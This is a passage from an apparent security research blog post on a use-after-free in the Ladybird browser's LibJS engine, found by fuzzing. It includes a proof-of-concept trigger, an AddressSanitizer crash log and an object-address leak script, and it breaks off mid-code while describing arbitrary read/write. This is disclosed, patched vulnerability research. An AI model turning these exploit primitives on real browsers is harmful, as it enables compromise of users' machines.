<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/">Original</a>
    <h1>Pwning the Ladybird Browser</h1>
    
    <div id="readability-page-1" class="page"><div><h2 id="intro">Intro</h2><p><a href="https://ladybird.org">Ladybird</a> is a relatively new browser engine originating from the
<a href="https://github.com/SerenityOS/serenity">SerenityOS project</a>. Currently, itâ€™s in pre-alpha and improving quickly.
Take a look at the website and the GitHub for more information!</p><p>Iâ€™ll be researching the JavaScript engine of Ladybird,
<a href="https://github.com/LadybirdBrowser/ladybird/tree/278666edcd74/Libraries/LibJS">LibJS</a>.</p><h2 id="architecture">Architecture</h2><p>LibJS has an interpreter tier and no compilation tiers (yet!). It includes common modern JS engine</p><h2 id="fuzzing">Fuzzing</h2><p>Weâ€™ll be using Fuzzilli, a popular fuzzer for JavaScript interpreters. Hereâ€™s the description from the GitHub:</p><blockquote>A (coverage-)guided fuzzer for dynamic language interpreters based on a custom
intermediate language (&#34;FuzzIL&#34;) which can be mutated and translated to JavaScript.
<cite>- <a href="https://github.com/googleprojectzero/fuzzilli">Fuzzilli</a></cite></blockquote><p>Fuzzilli can be configured with additional code generators that can be specialized to trigger
specific bugs. LibJS isnâ€™t actively being OSS-fuzzed, so I didnâ€™t add any custom generators and hoped
there would be enough shallow bugs around. There was already some persistent fuzzing code
in LibJS. After some work â€” like needing to compile and link Skia with RTTI (Nix ðŸ’œ), fixing
some build scripts, and compiling Fuzzilli with an additional profile (again, Nix was great for this) â€” I
got it all working!</p><p>I ran the fuzzer for ~10 days and found 10 unique crashes. A lot of the bugs were boring:</p><ul><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/88c4f71114f7cfcf7e667eb07dae21553c0e10c6">Verification failure</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/911b9157637653c984ccbbd2c0b990499f5597a0">Stack exhaustion</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/pull/3615">OOM bugs</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/356728b1e0c33aac879db285302f067a694ad28f">Bad bytecode generation</a>.</li></ul><p>There were a few bugs that were more interesting:</p><ul><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/83e46b372815d28475269d04ca6b98e97861b33a">A caching bug in the regex parser</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/f3a937ee769c2d9b4a78964641812171c4d03dd1">An integer overflow in <code>TypedArray</code></a></li></ul><p>Initially, I thought the regex bug was an integer overflowâ€¦ unfortunately, it wasnâ€™t. The real integer overflow</p><p>There were three bugs that looked really good: a heap buffer overflow, freelist corruption (or UAF) in the garbage
collector, and a heap use-after-free (UAF) in the malloc heap. But unfortunately, only the last UAF was reproducible outside of Fuzzilli.
<label for="sn-1"></label>

<span>I&#39;m still not sure why the others didn&#39;t reproduce. <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/heap-buff-overflow.js">This</a>
is the crash report for the
heap buffer overflow, and <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/gc-uaf.js">this</a> is the one for the freelist corruption,
if interested.</span></p><h2 id="the-bug">The Bug</h2><h3 id="a-vulnerable-function">A Vulnerable Function</h3><p>The bug is a use-after-free (UAF) on the interpreterâ€™s argument buffer. Itâ€™s triggered by using a
proxied function object as a constructor, together with a malicious <code>[[Get]]</code> handler.</p><p>Consider the following JavaScript:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>function</span> <span>Construct</span>() {}
</span></span><span><span><span>new</span> <span>Construct</span>();
</span></span></code></pre></div><p>The semantics are outlined
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new#description">here</a>.</p><p>This is how itâ€™s implemented in Ladybird:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>// 10.2.2 [[Construct]] ( argumentsList, newTarget )
</span></span></span><span><span><span></span>ThrowCompletionOr<span>&lt;</span>GC<span>::</span>Ref<span>&lt;</span>Object<span>&gt;&gt;</span> ECMAScriptFunctionObject<span>::</span>internal_construct(
</span></span><span><span>    ReadonlySpan<span>&lt;</span>Value<span>&gt;</span> arguments_list, <span>// [1]
</span></span></span><span><span><span></span>    FunctionObject<span>&amp;</span> new_target
</span></span><span><span>) {
</span></span><span><span>    <span>auto</span><span>&amp;</span> vm <span>=</span> <span>this</span><span>-&gt;</span>vm();
</span></span><span><span>
</span></span><span><span>    <span>// 1. Let callerContext be the running execution context.
</span></span></span><span><span><span></span>    <span>// NOTE: No-op, kept by the VM in its execution context stack.
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>// 2. Let kind be F.[[ConstructorKind]].
</span></span></span><span><span><span></span>    <span>auto</span> kind <span>=</span> m_constructor_kind;
</span></span><span><span>
</span></span><span><span>    GC<span>::</span>Ptr<span>&lt;</span>Object<span>&gt;</span> this_argument;
</span></span><span><span>
</span></span><span><span>    <span>// 3. If kind is base, then
</span></span></span><span><span><span></span>    <span>if</span> (kind <span>==</span> ConstructorKind<span>::</span>Base) {
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// a. Let thisArgument be ? OrdinaryCreateFromConstructor(newTarget, &#34;%Object.prototype%&#34;).
</span></span></span><span><span><span></span>        this_argument <span>=</span> TRY(ordinary_create_from_constructor<span>&lt;</span>Object<span>&gt;</span>(
</span></span><span><span>            vm,
</span></span><span><span>            new_target,
</span></span><span><span>            <span>&amp;</span>Intrinsics<span>::</span>object_prototype,
</span></span><span><span>            ConstructWithPrototypeTag<span>::</span>Tag
</span></span><span><span>        ));
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>auto</span> callee_context <span>=</span> ExecutionContext<span>::</span>create();
</span></span><span><span>
</span></span><span><span>    <span>// [3]
</span></span></span><span><span><span></span>    <span>// Non-standard
</span></span></span><span><span><span></span>    callee_context<span>-&gt;</span>arguments.ensure_capacity(max(arguments_list.size(), m_formal_parameters.size()));
</span></span><span><span>    callee_context<span>-&gt;</span>arguments.append(arguments_list.data(), arguments_list.size());
</span></span><span><span>    callee_context<span>-&gt;</span>passed_argument_count <span>=</span> arguments_list.size();
</span></span><span><span>    <span>if</span> (arguments_list.size() <span>&lt;</span> m_formal_parameters.size()) {
</span></span><span><span>        <span>for</span> (size_t i <span>=</span> arguments_list.size(); i <span>&lt;</span> m_formal_parameters.size(); <span>++</span>i)
</span></span><span><span>            callee_context<span>-&gt;</span>arguments.append(js_undefined());
</span></span><span><span>    }
</span></span><span><span>    <span>// [3 cont.] ...
</span></span></span></code></pre></div><p>The key parts are:</p><ul><li>First, it takes a reference to an argument buffer, <code>arguments_list</code>. [1]</li><li>Then, it creates a new object with the same prototype as the constructor function. [2]</li><li>Then, it executes the constructor with the arguments in <code>arguments_list</code>. [3]</li></ul><p>If the vector that <code>arguments_list</code> references is <code>free()</code>â€™d at any point between [1] and [3],
then <code>arguments_list</code> will dangle; and when itâ€™s used for the function call, it leads to a use-after-free.</p><p>Letâ€™s look at <code>ordinary_create_from_constructor</code>, called at [2]:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>// 10.1.13 OrdinaryCreateFromConstructor ( constructor, intrinsicDefaultProto [ , internalSlotsList ] )
</span></span></span><span><span><span></span><span>template</span><span>&lt;</span><span>typename</span> T, <span>typename</span>... Args<span>&gt;</span>
</span></span><span><span>ThrowCompletionOr<span>&lt;</span>GC<span>::</span>Ref<span>&lt;</span>T<span>&gt;&gt;</span> ordinary_create_from_constructor(
</span></span><span><span>    VM<span>&amp;</span> vm,
</span></span><span><span>    FunctionObject <span>const</span><span>&amp;</span> constructor,
</span></span><span><span>    GC<span>::</span>Ref<span>&lt;</span>Object<span>&gt;</span> (Intrinsics<span>::*</span>intrinsic_default_prototype)(),
</span></span><span><span>    Args<span>&amp;&amp;</span>... args)
</span></span><span><span>{
</span></span><span><span>    <span>auto</span><span>&amp;</span> realm <span>=</span> <span>*</span>vm.current_realm();
</span></span><span><span>    <span>auto</span><span>*</span> prototype <span>=</span> TRY(get_prototype_from_constructor(vm, constructor, intrinsic_default_prototype));
</span></span><span><span>    <span>return</span> realm.create<span>&lt;</span>T<span>&gt;</span>(forward<span>&lt;</span>Args<span>&gt;</span>(args)..., <span>*</span>prototype);
</span></span><span><span>}
</span></span></code></pre></div><p>It does the following:</p><ul><li>Gets the prototype of the constructor function</li><li>Creates a new JavaScript object with that prototype</li></ul><p>Itâ€™s a simple method, but it can have side effects if the constructor happens to be a
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxy object</a>.
If we override the constructor functionâ€™s <code>[[Get]]</code> internal method, the call to <code>get_prototype_from_constructor</code>
can execute arbitrary JavaScript code. This is useful if we can get that code to free the argument buffer.</p><h3 id="the-argument-buffer">The Argument Buffer</h3><p>The interpreter stores arguments for function calls in a vector called <code>m_argument_values_buffer</code>.
It can grow, shrink, be freed, or reallocated â€” and we have some control over when that happens.
For example, if the current buffer holds $5$ JS values, and we run:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>foo</span>(<span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>, <span>10</span>)
</span></span></code></pre></div><p>then the buffer will need to be freed and reallocated somewhere with space for 10 JS values.
Using this, we can free the interpreterâ€™s internal argument buffer â€” the same one that <code>arguments_list</code>
<em>still</em> points to â€” before itâ€™s used to set up the <code>callee_context</code> for the proceeding constructor call.</p><p>The fix is to do the prototype <code>[[Get]]</code> strictly <em>after</em> the callee context has been constructed.
<a href="https://github.com/LadybirdBrowser/ladybird/commit/f5a670421954fc7130c3685b713c621b29516669">Hereâ€™s</a>
the patch.</p><p>Hereâ€™s an example:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>function</span> <span>Construct</span>() {}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>handler</span> <span>=</span> {
</span></span><span><span>    <span>get</span>() {
</span></span><span><span>        <span>function</span> <span>meow</span>() {}
</span></span><span><span>        <span>meow</span>(<span>0x41</span>, <span>0x41</span>, <span>0x41</span>);
</span></span><span><span>    }
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>let</span> <span>ConstructProxy</span> <span>=</span> <span>new</span> Proxy(<span>Construct</span>, <span>handler</span>);
</span></span><span><span>
</span></span><span><span><span>new</span> <span>ConstructProxy</span>(<span>0x41</span>);
</span></span></code></pre></div><p>We override <code>Construct</code>â€™s <code>[[Get]]</code> internal method with a function that tries to reallocate the
argument buffer. Then we invoke the constructor to trigger the bug.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>âžœ</span>  ladybird git:(b8fa355a21) <span>âœ—</span> js bug<span>.</span>js
</span></span><span><span><span>=================================================================</span>
</span></span><span><span><span>==</span><span>8726</span><span>==</span>ERROR: AddressSanitizer: heap<span>-</span>use<span>-</span>after<span>-</span>free on address <span>0x5020000038f0</span> at pc <span>0x7f98dd1bf19e</span> bp <span>0x7ffcc8ee2ef0</span> sp <span>0x7ffcc8ee2ee8</span>
</span></span><span><span>READ of size <span>8</span> at <span>0x5020000038f0</span> thread T0
</span></span><span><span>    <span>#0 0x7f98dd1bf19d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xbbf19d)</span>
</span></span><span><span>    <span>#1 0x7f98dd1bdf8f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xbbdf8f)</span>
</span></span><span><span>    <span>#2 0x7f98dd22a555  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc2a555)</span>
</span></span><span><span>    <span>#3 0x7f98dd539cdd  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf39cdd)</span>
</span></span><span><span>    <span>#4 0x7f98dce78c0e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x878c0e)</span>
</span></span><span><span>    <span>#5 0x7f98dcdcdc0a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cdc0a)</span>
</span></span><span><span>    <span>#6 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#7 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#8 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#9 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#10 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#11 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>    <span>#12 0x7f98dae2a2b8  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a2b8) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>    <span>#13 0x562b5084ed14  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x42d14)</span>
</span></span><span><span>
</span></span><span><span><span>0x5020000038f0</span> <span>is</span> located <span>0</span> bytes inside of <span>16</span><span>-</span>byte region [<span>0x5020000038f0</span>,<span>0x502000003900</span>)
</span></span><span><span>freed by thread T0 here:
</span></span><span><span>    <span>#0 0x562b50940bf8  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x134bf8)</span>
</span></span><span><span>    <span>#1 0x7f98dcd39e1e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x739e1e)</span>
</span></span><span><span>    <span>#2 0x7f98dcd3963d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x73963d)</span>
</span></span><span><span>    <span>#3 0x7f98dce90c12  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x890c12)</span>
</span></span><span><span>    <span>#4 0x7f98dcdcd014  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cd014)</span>
</span></span><span><span>    <span>#5 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#6 0x7f98dd228b7f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc28b7f)</span>
</span></span><span><span>    <span>#7 0x7f98dd225cf6  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc25cf6)</span>
</span></span><span><span>    <span>#8 0x7f98dd530b92  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf30b92)</span>
</span></span><span><span>    <span>#9 0x7f98dd48e458  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xe8e458)</span>
</span></span><span><span>    <span>#10 0x7f98dd09a76f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xa9a76f)</span>
</span></span><span><span>    <span>#11 0x7f98dd232d4b  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc32d4b)</span>
</span></span><span><span>    <span>#12 0x7f98dd22a381  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc2a381)</span>
</span></span><span><span>    <span>#13 0x7f98dd539cdd  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf39cdd)</span>
</span></span><span><span>    <span>#14 0x7f98dce78c0e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x878c0e)</span>
</span></span><span><span>    <span>#15 0x7f98dcdcdc0a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cdc0a)</span>
</span></span><span><span>    <span>#16 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#17 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#18 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#19 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#20 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#21 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>
</span></span><span><span>previously allocated by thread T0 here:
</span></span><span><span>    <span>#0 0x562b50941bc7  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x135bc7)</span>
</span></span><span><span>    <span>#1 0x7f98dcd39c7f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x739c7f)</span>
</span></span><span><span>    <span>#2 0x7f98dcd3963d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x73963d)</span>
</span></span><span><span>    <span>#3 0x7f98dce90c12  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x890c12)</span>
</span></span><span><span>    <span>#4 0x7f98dcdcc161  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cc161)</span>
</span></span><span><span>    <span>#5 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#6 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#7 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#8 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#9 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#10 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>
</span></span><span><span>SUMMARY: AddressSanitizer: heap<span>-</span>use<span>-</span>after<span>-</span>free (<span>/</span>home<span>/</span>jess<span>/</span>code<span>/</span>ladybird<span>-</span>flake<span>/</span>ladybird<span>/</span>Build<span>/</span>old<span>/</span>bin<span>/../</span>lib64<span>/</span>liblagom<span>-</span>js<span>.</span>so<span>.0</span><span>+</span><span>0xbbf19d</span>)
</span></span><span><span>Shadow bytes around the buggy address:
</span></span><span><span>  <span>0x502000003600</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
</span></span><span><span>  <span>0x502000003680</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa fa fa <span>00</span> fa fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003700</span>: fa fa <span>00</span> fa fa fa fd fa fa fa fd fa fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003780</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span>
</span></span><span><span>  <span>0x502000003800</span>: fa fa fd fd fa fa fd fa fa fa <span>00</span> fa fa fa <span>00</span> fa
</span></span><span><span><span>=&gt;</span><span>0x502000003880</span>: fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span> fa fa <span>00</span> <span>00</span> fa fa[fd]fd
</span></span><span><span>  <span>0x502000003900</span>: fa fa <span>00</span> fa fa fa <span>00</span> fa fa fa <span>00</span> <span>00</span> fa fa <span>00</span> fa
</span></span><span><span>  <span>0x502000003980</span>: fa fa <span>00</span> fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003a00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003a80</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>  <span>0x502000003b00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
</span></span><span><span>Shadow byte legend (one shadow byte represents <span>8</span> application bytes):
</span></span><span><span>  Addressable:           <span>00</span>
</span></span><span><span>  Partially addressable: <span>01</span> <span>02</span> <span>03</span> <span>04</span> <span>05</span> <span>06</span> <span>07</span>
</span></span><span><span>  Heap left redzone:       fa
</span></span><span><span>  Freed heap region:       fd
</span></span><span><span>  Stack left redzone:      f1
</span></span><span><span>  Stack mid redzone:       f2
</span></span><span><span>  Stack right redzone:     f3
</span></span><span><span>  Stack after <span>return</span>:      f5
</span></span><span><span>  Stack use after scope:   f8
</span></span><span><span>  Global redzone:          f9
</span></span><span><span>  Global init order:       f6
</span></span><span><span>  Poisoned by user:        f7
</span></span><span><span>  Container overflow:      fc
</span></span><span><span>  Array cookie:            ac
</span></span><span><span>  Intra object redzone:    bb
</span></span><span><span>  ASan internal:           fe
</span></span><span><span>  Left alloca redzone:     ca
</span></span><span><span>  Right alloca redzone:    cb
</span></span><span><span><span>==</span><span>8726</span><span>==</span>ABORTING
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2><p>UAFâ€™s tend to be a nice primitive to work with. In this case, the UAF occurs in the glibc malloc heap
(since thatâ€™s where the argument buffer is allocated), rather than in a garbage-collected arena
where a lot of objects actually reside. The malloc heap mainly holds backing buffers and such,
introducing a bit of complexity when it comes to finding the right objects for a leak; although this is
somewhat mitigated by the powerful primitives available.</p><h3 id="leaking-an-object">Leaking an Object</h3><p>We can craft an <code>addrof</code>-capability by fitting a pointer somewhere inside the old <code>arguments_list</code> allocation,
then reading the
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>
object from inside the constructor.</p><p>Hereâ€™s an example of how we can leak the address of an object:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>let</span> <span>target</span> <span>=</span> {};
</span></span><span><span><span>let</span> <span>linked</span> <span>=</span> <span>new</span> <span>FinalizationRegistry</span>(() =&gt; {});
</span></span><span><span>
</span></span><span><span><span>function</span> <span>meow</span>() {}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>handler</span> <span>=</span> {
</span></span><span><span>    <span>get</span>() {
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// allocate more than 0x30 to free the chunk
</span></span></span><span><span><span></span>        <span>meow</span>(<span>0x1</span>, <span>0x2</span>, <span>0x3</span>, <span>0x4</span>, <span>0x5</span>, <span>0x6</span>);
</span></span><span><span>
</span></span><span><span>        <span>// [3]
</span></span></span><span><span><span></span>        <span>// allocate the free&#39;d chunk, with pointer to the target
</span></span></span><span><span><span></span>        <span>linked</span>.<span>register</span>(<span>target</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>, <span>undefined</span>)
</span></span><span><span>    }
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>function</span> <span>Construct</span>() {
</span></span><span><span>    <span>// [4]
</span></span></span><span><span><span></span>    <span>// read the linked list node, containing the pointer
</span></span></span><span><span><span></span>    <span>console</span>.<span>log</span>(<span>arguments</span>)
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>ConstructProxy</span> <span>=</span> <span>new</span> Proxy(<span>Construct</span>, <span>handler</span>);
</span></span><span><span>
</span></span><span><span><span>// [1]
</span></span></span><span><span><span>// allocate a 0x30 chunk
</span></span></span><span><span><span>// 0x8 * 5 (js values) + 0x8 (malloc metadata) = 0x30
</span></span></span><span><span><span></span><span>new</span> <span>ConstructProxy</span>(<span>0x1</span>, <span>0x2</span>, <span>0x3</span>, <span>0x4</span>, <span>0x5</span>);
</span></span></code></pre></div><p><label for="sn-2"></label>

<span>The series of <code>undefined</code> arguments on $[3]$ is to make sure the <i>linked list node</i> is allocated
in our free chunk and not any prelude allocations.</span></p><p><code>FinalizationRegistry</code> places linked list nodes with object pointers on the malloc heap
rendering them a useful structure to leak. Running the exploit we get the double representation of
the pointer, if we repeat a few times they change slightly, subject to ASLR</p><div><pre tabindex="0"><code data-lang="ruby"><span><span><span>âžœ</span>  ladybird <span>git</span>:(b8fa355a21) <span>âœ—</span> <span>Build</span><span>/</span>old<span>/</span>bin<span>/</span>js arguments<span>.</span>js
</span></span><span><span><span>ArgumentsObject</span>{ <span>&#34;0&#34;</span>: <span>6</span><span>.</span><span>9077829341497</span>e<span>-</span><span>310</span>, <span>&#34;1&#34;</span>: undefined, <span>&#34;2&#34;</span>: <span>0</span>, <span>&#34;3&#34;</span>: <span>0</span>, <span>&#34;4&#34;</span>: <span>5</span> }
</span></span><span><span><span>âžœ</span>  ladybird <span>git</span>:(b8fa355a21) <span>âœ—</span> <span>Build</span><span>/</span>old<span>/</span>bin<span>/</span>js arguments<span>.</span>js
</span></span><span><span><span>ArgumentsObject</span>{ <span>&#34;0&#34;</span>: <span>6</span><span>.</span><span>8997364430636</span>e<span>-</span><span>310</span>, <span>&#34;1&#34;</span>: undefined, <span>&#34;2&#34;</span>: <span>0</span>, <span>&#34;3&#34;</span>: <span>0</span>, <span>&#34;4&#34;</span>: <span>5</span> }
</span></span></code></pre></div><p>And sure enough when we <code>pack</code> into raw bytes, we get the pointer!</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> struct<span>.</span>pack(<span>&#34;&lt;d&#34;</span>, <span>6.8997364430636e-310</span>)[::<span>-</span><span>1</span>]<span>.</span>hex()
</span></span><span><span><span>&#39;00007f0350fc2118&#39;</span>
</span></span></code></pre></div><h3 id="creating-a-fake-object">Creating a Fake Object</h3><p>We can fake a JavaScript object pointer in a similar way. We allocate a buffer into <code>arguments_list</code>,
write our fake object pointer into it, and then use the fake object inside the constructor.
There are a few additional considerations:</p><ul><li>Our <code>free(arguments_list)</code> mechanism relies on vector reallocation, so the size of our target structures
needs to increase monotonically, and in steps large enough to trigger a reallocation.</li><li>Once we know where our fake object is, we need to tag it in accordance with Ladybirdâ€™s nan-boxing scheme,
so the engine knows its type.</li></ul><p>Apart from that, itâ€™s very similar; and weâ€™ll do so in the next section.</p><h2 id="arbitrary-readwrite">Arbitrary Read/Write</h2><p>Dynamic property lookups on objects are handled by the <code>get_by_value</code> function, shown below.
If the key is an index ([1]) and the object is an array-like ([2]) (it has an <code>m_indexed_properties</code> member),
then the property is fetched from the <code>m_indexed_properties</code> member.</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>inline</span> ThrowCompletionOr<span>&lt;</span>Value<span>&gt;</span> get_by_value(
</span></span><span><span>    VM<span>&amp;</span> vm,
</span></span><span><span>    Optional<span>&lt;</span>IdentifierTableIndex<span>&gt;</span> base_identifier,
</span></span><span><span>    Value base_value,
</span></span><span><span>    Value property_key_value,
</span></span><span><span>    Executable <span>const</span><span>&amp;</span> executable
</span></span><span><span>) {
</span></span><span><span>    <span>// [1]
</span></span></span><span><span><span></span>    <span>// OPTIMIZATION: Fast path for simple Int32 indexes in array-like objects.
</span></span></span><span><span><span></span>    <span>if</span> (base_value.is_object() <span>&amp;&amp;</span> property_key_value.is_int32() <span>&amp;&amp;</span> property_key_value.as_i32() <span>&gt;=</span> <span>0</span>) {
</span></span><span><span>        <span>auto</span><span>&amp;</span> object <span>=</span> base_value.as_object();
</span></span><span><span>        <span>auto</span> index <span>=</span> <span>static_cast</span><span>&lt;</span>u32<span>&gt;</span>(property_key_value.as_i32());
</span></span><span><span>
</span></span><span><span>        <span>auto</span> <span>const</span><span>*</span> object_storage <span>=</span> object.indexed_properties().storage();
</span></span><span><span>
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// For &#34;non-typed arrays&#34;:
</span></span></span><span><span><span></span>        <span>if</span> (<span>!</span>object.may_interfere_with_indexed_property_access()
</span></span><span><span>            <span>&amp;&amp;</span> object_storage) {
</span></span><span><span>            <span>auto</span> maybe_value <span>=</span> [<span>&amp;</span>] {
</span></span><span><span>                <span>// [3]
</span></span></span><span><span><span></span>                <span>if</span> (object_storage<span>-&gt;</span>is_simple_storage())
